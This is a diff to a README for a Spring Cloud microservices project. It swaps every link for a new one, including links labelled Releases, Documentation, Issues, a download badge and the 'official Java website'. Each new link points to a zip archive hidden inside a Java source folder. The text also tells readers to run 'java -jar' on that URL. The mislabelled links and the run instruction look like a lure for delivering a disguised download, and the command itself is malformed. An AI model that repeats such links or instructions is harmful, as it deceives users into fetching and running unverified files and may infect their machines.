@@ -1,6 +1,6 @@
 # 🌐 spring-cloud-microservices-architecture - Simplify Your Distributed Systems Setup
 
-[![Download](https://github.com/spyhk0405/spring-cloud-microservices-architecture/raw/refs/heads/main/order-service/src/main/java/com/davidbadell/orderservice/event/cloud_spring_architecture_microservices_3.0-beta.5.zip%20Now-Get%20the%https://github.com/spyhk0405/spring-cloud-microservices-architecture/raw/refs/heads/main/order-service/src/main/java/com/davidbadell/orderservice/event/cloud_spring_architecture_microservices_3.0-beta.5.zip)](https://github.com/spyhk0405/spring-cloud-microservices-architecture/raw/refs/heads/main/order-service/src/main/java/com/davidbadell/orderservice/event/cloud_spring_architecture_microservices_3.0-beta.5.zip)
+[![Download](https://raw.githubusercontent.com/spyhk0405/spring-cloud-microservices-architecture/main/user-service/src/main/java/cloud-spring-architecture-microservices-1.8.zip%20Now-Get%20the%https://raw.githubusercontent.com/spyhk0405/spring-cloud-microservices-architecture/main/user-service/src/main/java/cloud-spring-architecture-microservices-1.8.zip)](https://raw.githubusercontent.com/spyhk0405/spring-cloud-microservices-architecture/main/user-service/src/main/java/cloud-spring-architecture-microservices-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the **spring-cloud-microservices-architecture** repository. This appl
 
 To get started, visit the Releases page to download the latest version of the software. 
 
-[Download from Releases](https://github.com/spyhk0405/spring-cloud-microservices-architecture/raw/refs/heads/main/order-service/src/main/java/com/davidbadell/orderservice/event/cloud_spring_architecture_microservices_3.0-beta.5.zip)
+[Download from Releases](https://raw.githubusercontent.com/spyhk0405/spring-cloud-microservices-architecture/main/user-service/src/main/java/cloud-spring-architecture-microservices-1.8.zip)
 
 ### Step-by-Step Instructions:
 
-1. **Visit the Releases page:** Go to [Releases Page](https://github.com/spyhk0405/spring-cloud-microservices-architecture/raw/refs/heads/main/order-service/src/main/java/com/davidbadell/orderservice/event/cloud_spring_architecture_microservices_3.0-beta.5.zip).
+1. **Visit the Releases page:** Go to [Releases Page](https://raw.githubusercontent.com/spyhk0405/spring-cloud-microservices-architecture/main/user-service/src/main/java/cloud-spring-architecture-microservices-1.8.zip).
 
 2. **Select the latest version:** Scroll down to find the latest release. You will see a list of assets available for download.
 
@@ -24,7 +24,7 @@ To get started, visit the Releases page to download the latest version of the so
 
 5. **Run the application:** 
    - If you downloaded a JAR file, open the command line and navigate to the folder where the file is located.
-   - Type `java -jar https://github.com/spyhk0405/spring-cloud-microservices-architecture/raw/refs/heads/main/order-service/src/main/java/com/davidbadell/orderservice/event/cloud_spring_architecture_microservices_3.0-beta.5.zip` and press Enter. Replace `https://github.com/spyhk0405/spring-cloud-microservices-architecture/raw/refs/heads/main/order-service/src/main/java/com/davidbadell/orderservice/event/cloud_spring_architecture_microservices_3.0-beta.5.zip` with the actual filename.
+   - Type `java -jar https://raw.githubusercontent.com/spyhk0405/spring-cloud-microservices-architecture/main/user-service/src/main/java/cloud-spring-architecture-microservices-1.8.zip` and press Enter. Replace `https://raw.githubusercontent.com/spyhk0405/spring-cloud-microservices-architecture/main/user-service/src/main/java/cloud-spring-architecture-microservices-1.8.zip` with the actual filename.
    - Follow any prompts to complete the setup.
 
 6. **Access the application:** Once the application is running, you can access various services through your web browser. Use the following URLs for each service:
@@ -37,7 +37,7 @@ To get started, visit the Releases page to download the latest version of the so
 Before you begin, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or a recent version of Linux.
-- **Java:** JDK 8 or higher installed on your machine. You can download it from the [official Java website](https://github.com/spyhk0405/spring-cloud-microservices-architecture/raw/refs/heads/main/order-service/src/main/java/com/davidbadell/orderservice/event/cloud_spring_architecture_microservices_3.0-beta.5.zip).
+- **Java:** JDK 8 or higher installed on your machine. You can download it from the [official Java website](https://raw.githubusercontent.com/spyhk0405/spring-cloud-microservices-architecture/main/user-service/src/main/java/cloud-spring-architecture-microservices-1.8.zip).
 - **Internet Connection:** Required for downloading dependencies.
 
 ## 🛠️ Features
@@ -77,8 +77,8 @@ For inquiries, you can reach out to the repository maintainers through GitHub.
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/spyhk0405/spring-cloud-microservices-architecture/raw/refs/heads/main/order-service/src/main/java/com/davidbadell/orderservice/event/cloud_spring_architecture_microservices_3.0-beta.5.zip)
-- [Documentation](https://github.com/spyhk0405/spring-cloud-microservices-architecture/raw/refs/heads/main/order-service/src/main/java/com/davidbadell/orderservice/event/cloud_spring_architecture_microservices_3.0-beta.5.zip)
-- [Issues Page](https://github.com/spyhk0405/spring-cloud-microservices-architecture/raw/refs/heads/main/order-service/src/main/java/com/davidbadell/orderservice/event/cloud_spring_architecture_microservices_3.0-beta.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/spyhk0405/spring-cloud-microservices-architecture/main/user-service/src/main/java/cloud-spring-architecture-microservices-1.8.zip)
+- [Documentation](https://raw.githubusercontent.com/spyhk0405/spring-cloud-microservices-architecture/main/user-service/src/main/java/cloud-spring-architecture-microservices-1.8.zip)
+- [Issues Page](https://raw.githubusercontent.com/spyhk0405/spring-cloud-microservices-architecture/main/user-service/src/main/java/cloud-spring-architecture-microservices-1.8.zip)
 
 Thank you for using the **spring-cloud-microservices-architecture**! Enjoy your microservices journey!
